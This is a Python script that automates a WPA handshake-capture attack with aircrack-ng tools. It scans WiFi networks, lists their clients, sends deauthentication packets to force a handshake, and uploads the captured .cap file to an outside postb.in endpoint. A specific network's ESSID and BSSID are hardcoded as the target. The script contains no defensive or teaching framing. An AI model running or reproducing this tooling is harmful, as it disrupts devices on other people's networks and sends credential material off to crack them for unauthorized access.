#!/usr/bin/env python
#tGcaHS7eXfZGsRViSw

import logging
import CSVHelper
import ScriptUtils
import XMLHelper
import JSONHelper
import requests

SERVER_ADDR = "https://postb.in/1602363645786-8894055658020"

#run airmon start
def startMonitoring():
    network_card = "wlan1"
    p = ScriptUtils.commandAsRoot("airmon-ng start %s" % network_card)
    return network_card + "mon"

#reset
def reset():
    ScriptUtils.stopInterface()
    ScriptUtils.rmOutputs()

#run airodump who extract resut into airodump-01.kismet.csv
def getAllWifi(monitoring):
    command = "timeout 5 airodump-ng -w airodump --output-format kismet %s" % monitoring
    return ScriptUtils.commandAsRootWithTimeout(command, 6)

#analyze network to see all devices into the network
def analyzeNetwork(network, monitoring, timeout):
    command = "timeout %i airodump-ng -c %s --bssid %s -w ./output/ %s" % (timeout, network['channel'],network['bssid'],monitoring)
    return ScriptUtils.commandAsRootWithTimeout(command, 21)

#get network from essid
def getNetworkByESSID(networks, essid):
    for n in networks:
        if n.essid == essid:
            return n 

#get handshake thanks to client
def getHandshake(bssid, mac, monitoring):
    command = "timeout 20 aireplay-ng -0 2 -a %s -c %s %s" % (bssid,mac ,monitoring)
    return ScriptUtils.commandAsRootWithTimeout(command,21)

#mv @handshake to @location
def mvHandshake(handshake, location):
    command = "mv "+handshake+" "+location
    return ScriptUtils.command(command)

#-----STEP 1------

#get networks
def getNetworks():
    monitoring = startMonitoring()
    getAllWifi(monitoring)
    networks = CSVHelper.parseCSV("airodump-01.kismet.csv")
    reset()
    
    return JSONHelper.dumpListObject(networks)

#-----STEP 2------
#Need test on multiple devices connected

#get networks
def getDevices(network):
    monitoring = startMonitoring()
    analyzeNetwork(network,monitoring,20)
    clients = XMLHelper.getClientMac("./output/-01.kismet.netxml")
    reset()
    return JSONHelper.dumpListObject(clients)
    


#-----STEP 3-----#

#Send handshake
def sendHandshake(network):
    name = network['essid'] + '_handshake.cap'
    with open('./output/-01.cap','rb') as f:
        r = requests.post(SERVER_ADDR,files={name: f})

#Get Handshake
def getAndSendHandshake(network,mac):
    monitoring = startMonitoring()
    analyzeNetwork(network,monitoring,5)
    result = getHandshake(network['bssid'],mac,monitoring)
    sendHandshake(network)
    reset()
    return result

def main():
    network = {
        "encryption":"WPA,AES-CCM,TKIP",
        "essid": "SFR_9D10",
        "bssid": "60:35:C0:3A:9D:16",
        "channel": "1"
    }
    sendHandshake(network)

if __name__ == "__main__":
    logging.basicConfig(format='%(asctime)s %(levelname)s:%(message)s',filename='script.log',filemode='w',level=logging.DEBUG)
    main()
    #reset()